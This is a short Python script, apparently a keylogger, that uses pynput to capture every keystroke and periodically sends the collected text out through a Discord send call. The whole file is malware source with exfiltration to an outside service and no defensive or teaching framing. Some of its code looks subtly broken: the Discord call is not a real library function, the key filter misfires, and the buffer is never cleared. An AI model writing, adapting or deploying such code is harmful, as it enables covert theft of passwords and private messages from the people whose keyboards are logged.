from pynput.keyboard import Key, Listener
import discord

count = 0
keys = []

def on_press(key):
    print(key, end= " ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        sendDiscord(keys)

def sendDiscord(keys):
    msg = ""
    for key in keys:
        k = key.replace("'","\n")
        if key == "Key.space":
            k = " " 
        elif key.find("Key")>0:
            k = ""
        msg += k
    print(msg)
    discord.send(msg)

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

    